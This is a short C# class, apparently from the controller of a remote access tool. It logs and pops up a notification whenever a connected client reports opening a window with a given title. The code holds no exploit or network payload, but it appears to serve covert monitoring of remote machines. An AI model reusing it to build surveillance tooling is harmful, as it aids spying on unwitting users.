using System.Drawing;
using Server.Connection;

namespace Server.Handle_Packet
{
    public class HandleReportWindow
    {
        public HandleReportWindow(Clients client, string title)
        {
            new HandleLogs().Addmsg($"Client {client.Ip} opened [{title}]", Color.Blue);
            if (Properties.Settings.Default.Notification)
            {
                Program.Form1.notifyIcon1.BalloonTipText = $"Client {client.Ip} opened [{title}]";
                Program.Form1.notifyIcon1.ShowBalloonTip(100);
            }
        }
    }
}